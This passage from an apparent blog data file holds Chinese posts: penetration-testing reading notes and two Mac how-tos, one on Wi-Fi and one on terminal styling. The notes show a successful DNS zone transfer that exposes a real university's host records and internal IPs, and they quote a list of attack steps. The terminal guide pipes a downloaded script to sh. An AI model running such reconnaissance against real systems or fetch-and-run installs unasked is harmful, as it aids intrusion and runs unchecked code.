class=\"line\">archives.csust.edu.cn.\t86400\tIN\tA\t222.240.152.232</div><div class=\"line\">bid.csust.edu.cn.\t86400\tIN\tCNAME\tjtcloud.csust.edu.cn.</div><div class=\"line\">bw.csust.edu.cn.\t86400\tIN\tA\t10.255.194.20</div><div class=\"line\">cas.csust.edu.cn.\t86400\tIN\tA\t210.43.198.1</div><div class=\"line\">cslgqkzx.csust.edu.cn.\t86400\tIN\tA\t210.43.188.80</div><div class=\"line\">cslgxbsk.csust.edu.cn.\t86400\tIN\tCNAME\tcslgqkzx.csust.edu.cn.</div><div class=\"line\">cslgxbzk.csust.edu.cn.\t86400\tIN\tCNAME\tcslgqkzx.csust.edu.cn.</div><div class=\"line\">cwcx.csust.edu.cn.\t86400\tIN\tA\t10.22.14.252</div><div class=\"line\">cxlt.csust.edu.cn.\t86400\tIN\tA\t222.240.152.203</div><div class=\"line\">dkxnsyzx.csust.edu.cn.\t86400\tIN\tA\t222.240.152.200</div><div class=\"line\">dlkjxb.csust.edu.cn.\t86400\tIN\tCNAME\tcslgqkzx.csust.edu.cn.</div><div class=\"line\">dns.csust.edu.cn.\t86400\tIN\tA\t210.43.192.8</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tSOA\tdns.csust.edu.cn. root.localhost.csust.edu.cn. 20160725 28800 7200 604800 86400</div><div class=\"line\">;; Query time: 62 msec</div><div class=\"line\">;; SERVER: 210.43.192.8<span class=\"comment\">#53(210.43.192.8)</span></div><div class=\"line\">;; WHEN: Sat Jul 30 20:18:47 2016</div><div class=\"line\">;; XFR size: 112 records (messages 1, bytes 2369)</div></pre></td></tr></table></figure></p>\n<p>可以看到，各种信息，从A、cname到MX全部暴露无遗。<br>如果不存在该漏洞则会被服务器拒绝查询请求。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">ivan@Ivan ~ dig @dns4.tju.edu.cn tju.edu.cn axfr</div><div class=\"line\">; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; @dns4.tju.edu.cn tju.edu.cn axfr</div><div class=\"line\">; (1 server found)</div><div class=\"line\">;; global options: +cmd</div><div class=\"line\">; Transfer failed.</div></pre></td></tr></table></figure>\n<h3 id=\"whois\"><a href=\"#whois\" class=\"headerlink\" title=\"whois\"></a>whois</h3><p>whois查询，不多解释了</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div></pre></td><td class=\"code\"><pre><div class=\"line\">ivan@Ivan ~ whois yfgeek.com</div><div class=\"line\"></div><div class=\"line\">Whois Server Version 2.0</div><div class=\"line\"></div><div class=\"line\">Domain names <span class=\"keyword\">in</span> the .com and .net domains can now be registered</div><div class=\"line\">with many different competing registrars. Go to http://www.internic.net</div><div class=\"line\"><span class=\"keyword\">for</span> detailed information.</div><div class=\"line\"></div><div class=\"line\">   Domain Name: YFGEEK.COM</div><div class=\"line\">   Registrar: GODADDY.COM, LLC</div><div class=\"line\">   Sponsoring Registrar IANA ID: 146</div><div class=\"line\">   Whois Server: whois.godaddy.com</div><div class=\"line\">   Referral URL: http://www.godaddy.com</div><div class=\"line\">   Name Server: F1G1NS1.DNSPOD.NET</div><div class=\"line\">   Name Server: F1G1NS2.DNSPOD.NET</div><div class=\"line\">   Status: clientDeleteProhibited https://icann.org/epp<span class=\"comment\">#clientDeleteProhibited</span></div><div class=\"line\">   Status: clientRenewProhibited https://icann.org/epp<span class=\"comment\">#clientRenewProhibited</span></div><div class=\"line\">   Status: clientTransferProhibited https://icann.org/epp<span class=\"comment\">#clientTransferProhibited</span></div><div class=\"line\">   Status: clientUpdateProhibited https://icann.org/epp<span class=\"comment\">#clientUpdateProhibited</span></div><div class=\"line\">   Updated Date: 21-apr-2016</div><div class=\"line\">   Creation Date: 23-nov-2012</div><div class=\"line\">   Expiration Date: 23-nov-2017</div></pre></td></tr></table></figure>\n","excerpt":"<p>记得前几周去参加过一个阿里巴巴举办的安全峰会，其中一个大牛讲到以前的渗透测试三字经，当场真是笑出声：</p>\n<blockquote>\n<p>进谷歌 找注入 没注入 就旁注 没旁注 用0day 没0day 猜目录 没目录 就嗅探</p>\n<p>爆账户 找后台 传小马 放大马 拿权限 挂页面  放暗连 清数据 拿不下 去自杀 死不了 继续来 查资料 去社工！</p>\n</blockquote>\n<p>其实，我觉得渗透测试无论怎么变，不外乎这几点：</p>\n<blockquote>\n<p>信息收集阶段-&gt;漏洞检测阶段-&gt;漏洞利用阶段-&gt;持久化后门阶段</p>\n</blockquote>\n<p>最近借了本好书《高度安全环境下的高级渗透测试》，这本书内容浅显易懂，但却很实用，虽然很多内容都知道，但是不成系统，这本书总结工作做得非常好，总结一下读书笔记。<br>","more":"</p>\n<h1 id=\"信息收集阶段\"><a href=\"#信息收集阶段\" class=\"headerlink\" title=\"信息收集阶段\"></a>信息收集阶段</h1><h2 id=\"DNS信息\"><a href=\"#DNS信息\" class=\"headerlink\" title=\"DNS信息\"></a>DNS信息</h2><p>其实DNS信息收集阶段用两个Linux系统自带工具即可完成。</p>\n<h3 id=\"nslookup\"><a href=\"#nslookup\" class=\"headerlink\" title=\"nslookup\"></a>nslookup</h3><p>此命令，可以快速查处ip地址<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\"> ✘ ivan@Ivan~ nslookup zhihu.com</div><div class=\"line\">Server:\t\t114.114.114.114</div><div class=\"line\">Address:\t114.114.114.114<span class=\"comment\">#53</span></div><div class=\"line\"></div><div class=\"line\">Non-authoritative answer:</div><div class=\"line\">Name:\tzhihu.com</div><div class=\"line\">Address: 54.223.189.245</div></pre></td></tr></table></figure></p>\n<p>当然也可以指定dns查询服务器：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">ivan@Ivan ~ nslookup -type=ns zhihu.com 8.8.8.8</div><div class=\"line\">Server:\t\t8.8.8.8</div><div class=\"line\">Address:\t8.8.8.8<span class=\"comment\">#53</span></div><div class=\"line\"></div><div class=\"line\">Non-authoritative answer:</div><div class=\"line\">zhihu.com\tnameserver = ns3.dnsv4.com.</div><div class=\"line\">zhihu.com\tnameserver = ns4.dnsv4.com.</div><div class=\"line\"></div><div class=\"line\">Authoritative answers can be found from:</div></pre></td></tr></table></figure></p>\n<h3 id=\"dig\"><a href=\"#dig\" class=\"headerlink\" title=\"dig\"></a>dig</h3><p>dig真是个好工具，甚至可以找出DNS域传送漏洞。下面举一个例子，也是乌云网曝光过的，由于篇幅问题，精简了很多内容：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div></pre></td><td class=\"code\"><pre><div class=\"line\">ivan@Ivan  ~  dig @dns.csust.edu.cn csust.edu.cn axfr</div><div class=\"line\"></div><div class=\"line\">; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; @dns.csust.edu.cn csust.edu.cn axfr</div><div class=\"line\">; (1 server found)</div><div class=\"line\">;; global options: +cmd</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tSOA\tdns.csust.edu.cn. root.localhost.csust.edu.cn. 20160725 28800 7200 604800 86400</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tNS\tdns.csust.edu.cn.</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tNS\tdns2.csust.edu.cn.</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tA\t113.240.233.146</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tA\t210.43.192.8</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tA\t210.43.192.18</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tMX\t5 mxbiz1.qq.com.</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tMX\t10 mxbiz2.qq.com.</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tAAAA\t2001:da8:d002::d22b:c008</div><div class=\"line\">3g.csust.edu.cn.\t86400\tIN\tA\t113.240.233.6</div><div class=\"line\">app.csust.edu.cn.\t86400\tIN\tA\t113.240.233.11</div><div class=\"line\">app7.csust.edu.cn.\t86400\tIN\tA\t222.240.152.227</div><div class=\"line\">app8.csust.edu.cn.\t86400\tIN\tA\t113.240.233.8</div><div class=\"line\">archives.csust.edu.cn.\t86400\tIN\tA\t222.240.152.232</div><div class=\"line\">bid.csust.edu.cn.\t86400\tIN\tCNAME\tjtcloud.csust.edu.cn.</div><div class=\"line\">bw.csust.edu.cn.\t86400\tIN\tA\t10.255.194.20</div><div class=\"line\">cas.csust.edu.cn.\t86400\tIN\tA\t210.43.198.1</div><div class=\"line\">cslgqkzx.csust.edu.cn.\t86400\tIN\tA\t210.43.188.80</div><div class=\"line\">cslgxbsk.csust.edu.cn.\t86400\tIN\tCNAME\tcslgqkzx.csust.edu.cn.</div><div class=\"line\">cslgxbzk.csust.edu.cn.\t86400\tIN\tCNAME\tcslgqkzx.csust.edu.cn.</div><div class=\"line\">cwcx.csust.edu.cn.\t86400\tIN\tA\t10.22.14.252</div><div class=\"line\">cxlt.csust.edu.cn.\t86400\tIN\tA\t222.240.152.203</div><div class=\"line\">dkxnsyzx.csust.edu.cn.\t86400\tIN\tA\t222.240.152.200</div><div class=\"line\">dlkjxb.csust.edu.cn.\t86400\tIN\tCNAME\tcslgqkzx.csust.edu.cn.</div><div class=\"line\">dns.csust.edu.cn.\t86400\tIN\tA\t210.43.192.8</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tSOA\tdns.csust.edu.cn. root.localhost.csust.edu.cn. 20160725 28800 7200 604800 86400</div><div class=\"line\">;; Query time: 62 msec</div><div class=\"line\">;; SERVER: 210.43.192.8<span class=\"comment\">#53(210.43.192.8)</span></div><div class=\"line\">;; WHEN: Sat Jul 30 20:18:47 2016</div><div class=\"line\">;; XFR size: 112 records (messages 1, bytes 2369)</div></pre></td></tr></table></figure></p>\n<p>可以看到，各种信息，从A、cname到MX全部暴露无遗。<br>如果不存在该漏洞则会被服务器拒绝查询请求。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">ivan@Ivan ~ dig @dns4.tju.edu.cn tju.edu.cn axfr</div><div class=\"line\">; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; @dns4.tju.edu.cn tju.edu.cn axfr</div><div class=\"line\">; (1 server found)</div><div class=\"line\">;; global options: +cmd</div><div class=\"line\">; Transfer failed.</div></pre></td></tr></table></figure>\n<h3 id=\"whois\"><a href=\"#whois\" class=\"headerlink\" title=\"whois\"></a>whois</h3><p>whois查询，不多解释了</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div></pre></td><td class=\"code\"><pre><div class=\"line\">ivan@Ivan ~ whois yfgeek.com</div><div class=\"line\"></div><div class=\"line\">Whois Server Version 2.0</div><div class=\"line\"></div><div class=\"line\">Domain names <span class=\"keyword\">in</span> the .com and .net domains can now be registered</div><div class=\"line\">with many different competing registrars. Go to http://www.internic.net</div><div class=\"line\"><span class=\"keyword\">for</span> detailed information.</div><div class=\"line\"></div><div class=\"line\">   Domain Name: YFGEEK.COM</div><div class=\"line\">   Registrar: GODADDY.COM, LLC</div><div class=\"line\">   Sponsoring Registrar IANA ID: 146</div><div class=\"line\">   Whois Server: whois.godaddy.com</div><div class=\"line\">   Referral URL: http://www.godaddy.com</div><div class=\"line\">   Name Server: F1G1NS1.DNSPOD.NET</div><div class=\"line\">   Name Server: F1G1NS2.DNSPOD.NET</div><div class=\"line\">   Status: clientDeleteProhibited https://icann.org/epp<span class=\"comment\">#clientDeleteProhibited</span></div><div class=\"line\">   Status: clientRenewProhibited https://icann.org/epp<span class=\"comment\">#clientRenewProhibited</span></div><div class=\"line\">   Status: clientTransferProhibited https://icann.org/epp<span class=\"comment\">#clientTransferProhibited</span></div><div class=\"line\">   Status: clientUpdateProhibited https://icann.org/epp<span class=\"comment\">#clientUpdateProhibited</span></div><div class=\"line\">   Updated Date: 21-apr-2016</div><div class=\"line\">   Creation Date: 23-nov-2012</div><div class=\"line\">   Expiration Date: 23-nov-2017</div></pre></td></tr></table></figure>"},{"title":"Mac Wi-Fi掉线解决方案","date":"2016-10-09T14:07:52.000Z","_content":"\n最近连接学校的WiFi老掉线，经过清空WiFi默认配置后，成功。\n\n分享解决方案：\n\n进入目录`/Library/Preferences/SystemConfiguration\n`\n\n删除\n\n```\ncom.apple.airport.preferences.plist\ncom.apple.network.identification.plist\ncom.apple.wifi.message-tracer.plist\nNetworkInterfaces.plist\npreferences.plist\n```\n\n重启\n\n解决问题。\n\n转载自：http://blog.chenxiaosheng.com/posts/2014-11-17/mac_osx_yosemite_fix_wifi_problems.html","source":"_posts/Mac-Wi-Fi-掉线解决方案-1.md","raw":"---\ntitle: Mac Wi-Fi掉线解决方案\ndate: 2016-10-09 15:07:52\ntags: Mac\ncategories: Mac\n---\n\n最近连接学校的WiFi老掉线，经过清空WiFi默认配置后，成功。\n\n分享解决方案：\n\n进入目录`/Library/Preferences/SystemConfiguration\n`\n\n删除\n\n```\ncom.apple.airport.preferences.plist\ncom.apple.network.identification.plist\ncom.apple.wifi.message-tracer.plist\nNetworkInterfaces.plist\npreferences.plist\n```\n\n重启\n\n解决问题。\n\n转载自：http://blog.chenxiaosheng.com/posts/2014-11-17/mac_osx_yosemite_fix_wifi_problems.html","slug":"Mac-Wi-Fi-掉线解决方案-1","published":1,"updated":"2016-10-09T14:19:23.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciubisk9x000g3sonqkta92ab","content":"<p>最近连接学校的WiFi老掉线，经过清空WiFi默认配置后，成功。</p>\n<p>分享解决方案：</p>\n<p>进入目录<code>/Library/Preferences/SystemConfiguration</code></p>\n<p>删除</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">com.apple.airport.preferences.plist</div><div class=\"line\">com.apple.network.identification.plist</div><div class=\"line\">com.apple.wifi.message-tracer.plist</div><div class=\"line\">NetworkInterfaces.plist</div><div class=\"line\">preferences.plist</div></pre></td></tr></table></figure>\n<p>重启</p>\n<p>解决问题。</p>\n<p>转载自：<a href=\"http://blog.chenxiaosheng.com/posts/2014-11-17/mac_osx_yosemite_fix_wifi_problems.html\" target=\"_blank\" rel=\"external\">http://blog.chenxiaosheng.com/posts/2014-11-17/mac_osx_yosemite_fix_wifi_problems.html</a></p>\n","excerpt":"","more":"<p>最近连接学校的WiFi老掉线，经过清空WiFi默认配置后，成功。</p>\n<p>分享解决方案：</p>\n<p>进入目录<code>/Library/Preferences/SystemConfiguration</code></p>\n<p>删除</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">com.apple.airport.preferences.plist</div><div class=\"line\">com.apple.network.identification.plist</div><div class=\"line\">com.apple.wifi.message-tracer.plist</div><div class=\"line\">NetworkInterfaces.plist</div><div class=\"line\">preferences.plist</div></pre></td></tr></table></figure>\n<p>重启</p>\n<p>解决问题。</p>\n<p>转载自：<a href=\"http://blog.chenxiaosheng.com/posts/2014-11-17/mac_osx_yosemite_fix_wifi_problems.html\">http://blog.chenxiaosheng.com/posts/2014-11-17/mac_osx_yosemite_fix_wifi_problems.html</a></p>\n"},{"title":"iTerm2 美化全过程","id":"2","updated":"2016-08-05T20:14:29.000Z","date":"2016-07-28T08:49:20.000Z","_content":"\n\n本文介绍了iTerm2的美化过程，包括安装oh my zsh，powerline，以及对vim的美化。\n# 1.首先下载 iTerm 2\n# 2.打开iTerm 2\n# 3.输入下面指令安装oh-my-zsh\n`curl -L https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh | sh`\n# 4.接下来安装Powerline\n在官网有教程，我们只需要执行官网第一条安装指令就行\n如果你的终端能够正常执行pip指令，那么直接执行下面的指令可以完成安装\n\n`pip install powerline-status`\n\n如果没有，则先执行安装pip指令\n\n`sudo easy_install pip`\n\n# 5.下载、安装库字体库\n1）将工程下载下来后cd到`install.sh`文件所在目录\n2）执行指令安装字体库\n\n执行`./install.sh`指令安装所有Powerline字体\n\n安装完成后提示所有字体均已下载到`/Users/superdanny/Library/Fonts`路径下\n`All Powerline fonts installed to /Users/superdanny/Library/Fonts`\n\n# 6. 设置iTerm 2的Regular Font 和 Non-ASCII Font\n\n安装完字体库之后，把iTerm 2的设置里的Profile中的Text 选项卡中里的Regular Font和Non-ASCII Font的字体都设置成 Powerline的字体，我这里设置的字体是12pt Meslo LG S DZ Regular for Powerline\n\n### 7. 配色方案\n1）安装配色方案\n进入刚刚下载的工程的solarized/iterm2-colors-solarized 下双击 Solarized Dark.itermcolors 和 Solarized Light.itermcolors 两个文件就可以把配置文件导入到 iTerm2 里\n\n2）配置配色方案\n通过load presets选择刚刚安装的配色主题即可\n\n### 8. 使用agnoster主题\n1）下载agnoster主题\n到下载的工程里面运行install文件,主题将安装到`~/.oh-my-zsh/themes`目录下\n\n2）设置该主题\n进入~/.zshrc打开.zshrc文件，然后将`ZSH_THEME`后面的字段改为`agnoster`。`ZSH_THEME=\"agnoster\"`（agnoster即为要设置的主题）\n\n### 9. 增加指令高亮效果——zsh-syntax-highlighting\n指令高亮效果作用是当用户输入正确命令时指令会绿色高亮，错误时命令红色高亮\n\n1）cd到.zshrc所在目录\n\n2）执行指令将工程克隆到当前目录\n\n`git clone git://github.com/zsh-users/zsh-syntax-highlighting.git`\n\n3）打开.zshrc文件，在最后添加下面内容\n\n`source XXX/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh`\n\n保存文件。\n\n注意：xxx代表`.zshrc`所在目录\n\n4）`cd ~/.oh-my-zsh/custom/plugins`\n\n5）再次打开`.zshrc`文件，在最后面添加下面内容`plugins=(zsh-syntax-highlighting)`保存文件。\n\n**启动iTerm 2 默认使用dash改用zsh解决方法：**\n`chsh -s /bin/zsh`\n### Vim\n\n`$ cd solarized\n$ cd vim-colors-solarized/colors\n$ mkdir -p ~/.vim/colors\n$ cp solarized.vim ~/.vim/colors/\n`\n`$ vi ~/.vimrc\nsyntax enable\nset background=dark\ncolorscheme solarized`\n\n### ls\n\nMac OS X 是基于 FreeBSD 的，所以一些工具 ls, top 等都是 BSD 那一套，ls 不是 GNU ls，所以即使 Terminal/iTerm2 配置了颜色，但是在 Mac 上敲入 ls 命令也不会显示高亮，可以通过安装 coreutils 来解决（`brew install coreutils`），不过如果对 ls 颜色不挑剔的话有个简单办法就是在 .bash_profile 里输出 CLICOLOR=1：\n\n`$ vi ~/.bash_profile\nexport CLICOLOR=1`\n","source":"_posts/iTerm2-美化全过程.md","raw":"---\ntitle: iTerm2 美化全过程\ntags: 'Mac'\npermalink: iterm2-mei-hua-quan-guo-cheng\nid: 2\nupdated: '2016-08-05 21:14:29'\ndate: 2016-07-28 09:49:20\n---\n\n\n本文介绍了iTerm2的美化过程，包括安装oh my zsh，powerline，以及对vim的美化。\n# 1.首先下载 iTerm 2\n# 2.打开iTerm 2\n# 3.输入下面指令安装oh-my-zsh\n`curl -L https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh | sh`\n# 4.接下来安装Powerline\n在官网有教程，我们只需要执行官网第一条安装指令就行\n如果你的终端能够正常执行pip指令，那么直接执行下面的指令可以完成安装\n\n`pip install powerline-status`\n\n如果没有，则先执行安装pip指令\n\n`sudo easy_install pip`\n\n# 5.下载、安装库字体库\n1）将工程下载下来后cd到`install.sh`文件所在目录\n2）执行指令安装字体库\n\n执行`./install.sh`指令安装所有Powerline字体\n\n安装完成后提示所有字体均已下载到`/Users/superdanny/Library/Fonts`路径下\n`All Powerline fonts installed to /Users/superdanny/Library/Fonts`\n\n# 6. 设置iTerm 2的Regular Font 和 Non-ASCII Font\n\n安装完字体库之后，把iTerm 2的设置里的Profile中的Text 选项卡中里的Regular Font和Non-ASCII Font的字体都设置成 Powerline的字体，我这里设置的字体是12pt Meslo LG S DZ Regular for Powerline\n\n### 7. 配色方案\n1）安装配色方案\n进入刚刚下载的工程的solarized/iterm2-colors-solarized 下双击 Solarized Dark.itermcolors 和 Solarized Light.itermcolors 两个文件就可以把配置文件导入到 iTerm2 里\n\n2）配置配色方案\n通过load presets选择刚刚安装的配色主题即可\n\n### 8. 使用agnoster主题\n1）下载agnoster主题\n到下载的工程里面运行install文件,主题将安装到`~/.oh-my-zsh/themes`目录下\n\n2）设置该主题\n进入~/.zshrc打开.zshrc文件，然后将`ZSH_THEME`后面的字段改为`agnoster`。`ZSH_THEME=\"agnoster\"`（agnoster即为要设置的主题）\n\n### 9. 增加指令高亮效果——zsh-syntax-highlighting\n指令高亮效果作用是当用户输入正确命令时指令会绿色高亮，错误时命令红色高亮\n\n1）cd到.zshrc所在目录\n\n2）执行指令将工程克隆到当前目录\n\n`git clone git://github.com/zsh-users/zsh-syntax-highlighting.git`\n\n3）打开.zshrc文件，在最后添加下面内容\n\n`source XXX/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh`\n\n保存文件。\n\n注意：xxx代表`.zshrc`所在目录\n\n4）`cd ~/.oh-my-zsh/custom/plugins`\n\n5）再次打开`.zshrc`文件，在最后面添加下面内容`plugins=(zsh-syntax-highlighting)`保存文件。\n\n**启动iTerm 2 默认使用dash改用zsh解决方法：**\n`chsh -s /bin/zsh`\n### Vim\n\n`$ cd solarized\n$ cd vim-colors-solarized/colors\n$ mkdir -p ~/.vim/colors\n$ cp solarized.vim ~/.vim/colors/\n`\n`$ vi ~/.vimrc\nsyntax enable\nset background=dark\ncolorscheme solarized`\n\n### ls\n\nMac OS X 是基于 FreeBSD 的，所以一些工具 ls, top 等都是 BSD 那一套，ls 不是 GNU ls，所以即使 Terminal/iTerm2 配置了颜色，但是在 Mac 上敲入 ls 命令也不会显示高亮，可以通过安装 coreutils 来解决（`brew install coreutils`），不过如果对 ls 颜色不挑剔的话有个简单办法就是在 .bash_profile 里输出 CLICOLOR=1：\n\n`$ vi ~/.bash_profile\nexport CLICOLOR=1`\n","slug":"iterm2-mei-hua-quan-guo-cheng","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ciubiska0000j3sonrvnktuo5","content":"<p>本文介绍了iTerm2的美化过程，包括安装oh my zsh，powerline，以及对vim的美化。</p>\n<h1 id=\"1-首先下载-iTerm-2\"><a href=\"#1-首先下载-iTerm-2\" class=\"headerlink\" title=\"1.首先下载 iTerm 2\"></a>1.首先下载 iTerm 2</h1><h1 id=\"2-打开iTerm-2\"><a href=\"#2-打开iTerm-2\" class=\"headerlink\" title=\"2.打开iTerm 2\"></a>2.打开iTerm 2</h1><h1 id=\"3-输入下面指令安装oh-my-zsh\"><a href=\"#3-输入下面指令安装oh-my-zsh\" class=\"headerlink\" title=\"3.输入下面指令安装oh-my-zsh\"></a>3.输入下面指令安装oh-my-zsh</h1><p><code>curl -L https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh | sh</code></p>\n<h1 id=\"4-接下来安装Powerline\"><a href=\"#4-接下来安装Powerline\" class=\"headerlink\" title=\"4.接下来安装Powerline\"></a>4.接下来安装Powerline</h1><p>在官网有教程，我们只需要执行官网第一条安装指令就行<br>如果你的终端能够正常执行pip指令，那么直接执行下面的指令可以完成安装</p>\n<p><code>pip install powerline-status</code></p>\n<p>如果没有，则先执行安装pip指令</p>\n<p><code>sudo easy_install pip</code></p>\n<h1 id=\"5-下载、安装库字体库\"><a href=\"#5-下载、安装库字体库\" class=\"headerlink\" title=\"5.下载、安装库字体库\"></a>5.下载、安装库字体库</h1><p>1）将工程下载下来后cd到<code>install.sh</code>文件所在目录<br>2）执行指令安装字体库</p>\n<p>执行<code>./install.sh</code>指令安装所有Powerline字体</p>\n<p>安装完成后提示所有字体均已下载到<code>/Users/superdanny/Library/Fonts</code>路径下<br><code>All Powerline fonts installed to /Users/superdanny/Library/Fonts</code></p>\n<h1 id=\"6-设置iTerm-2的Regular-Font-和-Non-ASCII-Font\"><a href=\"#6-设置iTerm-2的Regular-Font-和-Non-ASCII-Font\" class=\"headerlink\" title=\"6. 设置iTerm 2的Regular Font 和 Non-ASCII Font\"></a>6. 设置iTerm 2的Regular Font 和 Non-ASCII Font</h1><p>安装完字体库之后，把iTerm 2的设置里的Profile中的Text 选项卡中里的Regular Font和Non-ASCII Font的字体都设置成 Powerline的字体，我这里设置的字体是12pt Meslo LG S DZ Regular for Powerline</p>\n<h3 id=\"7-配色方案\"><a href=\"#7-配色方案\" class=\"headerlink\" title=\"7. 配色方案\"></a>7. 配色方案</h3><p>1）安装配色方案<br>进入刚刚下载的工程的solarized/iterm2-colors-solarized 下双击 Solarized Dark.itermcolors 和 Solarized Light.itermcolors 两个文件就可以把配置文件导入到 iTerm2 里</p>\n<p>2）配置配色方案<br>通过load presets选择刚刚安装的配色主题即可</p>\n<h3 id=\"8-使用agnoster主题\"><a href=\"#8-使用agnoster主题\" class=\"headerlink\" title=\"8. 使用agnoster主题\"></a>8. 使用agnoster主题</h3><p>1）下载agnoster主题<br>到下载的工程里面运行install文件,主题将安装到<code>~/.oh-my-zsh/themes</code>目录下</p>\n<p>2）设置该主题<br>进入~/.zshrc打开.zshrc文件，然后将<code>ZSH_THEME</code>后面的字段改为<code>agnoster</code>。<code>ZSH_THEME=&quot;agnoster&quot;</code>（agnoster即为要设置的主题）</p>\n<h3 id=\"9-增加指令高亮效果——zsh-syntax-highlighting\"><a href=\"#9-增加指令高亮效果——zsh-syntax-highlighting\" class=\"headerlink\" title=\"9. 增加指令高亮效果——zsh-syntax-highlighting\"></a>9. 增加指令高亮效果——zsh-syntax-highlighting</h3><p>指令高亮效果作用是当用户输入正确命令时指令会绿色高亮，错误时命令红色高亮</p>\n<p>1）cd到.zshrc所在目录</p>\n<p>2）执行指令将工程克隆到当前目录</p>\n<p><code>git clone git://github.com/zsh-users/zsh-syntax-highlighting.git</code></p>\n<p>3）打开.zshrc文件，在最后添加下面内容</p>\n<p><code>source XXX/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh</code></p>\n<p>保存文件。</p>\n<p>注意：xxx代表<code>.zshrc</code>所在目录</p>\n<p>4）<code>cd ~/.oh-my-zsh/custom/plugins</code></p>\n<p>5）再次打开<code>.zshrc</code>文件，在最后面添加下面内容<code>plugins=(zsh-syntax-highlighting)</code>保存文件。</p>\n<p><strong>启动iTerm 2 默认使用dash改用zsh解决方法：</strong><br><code>chsh -s /bin/zsh</code></p>\n<h3 id=\"Vim\"><a href=\"#Vim\" class=\"headerlink\" title=\"Vim\"></a>Vim</h3><p><code>$ cd solarized\n$ cd vim-colors-solarized/colors\n$ mkdir -p ~/.vim/colors\n$ cp solarized.vim ~/.vim/colors/</code><br><code>$ vi ~/.vimrc\nsyntax enable\nset background=dark\ncolorscheme solarized</code></p>\n<h3 id=\"ls\"><a href=\"#ls\" class=\"headerlink\" title=\"ls\"></a>ls</h3><p>Mac OS X 是基于 FreeBSD 